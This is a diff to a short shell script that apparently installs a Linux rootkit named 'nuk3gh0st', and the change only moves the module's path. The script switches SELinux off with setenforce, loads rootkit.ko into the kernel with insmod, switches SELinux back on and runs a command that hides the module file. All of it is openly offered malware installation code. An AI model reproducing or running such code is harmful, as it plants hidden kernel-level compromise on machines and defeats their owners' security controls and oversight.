@@ -2,10 +2,10 @@
 
 if [ -f /usr/sbin/semanage ]; then
         setenforce 0
-        insmod /usr/lib/rootkit.ko
+        insmod /usr/share/nuk3gh0st/rootkit.ko
         setenforce 1
 else
-        insmod /usr/lib/rootkit.ko
+        insmod /usr/share/nuk3gh0st/rootkit.ko
 fi
 
 nuk3gh0st --hide-file=rootkit.ko
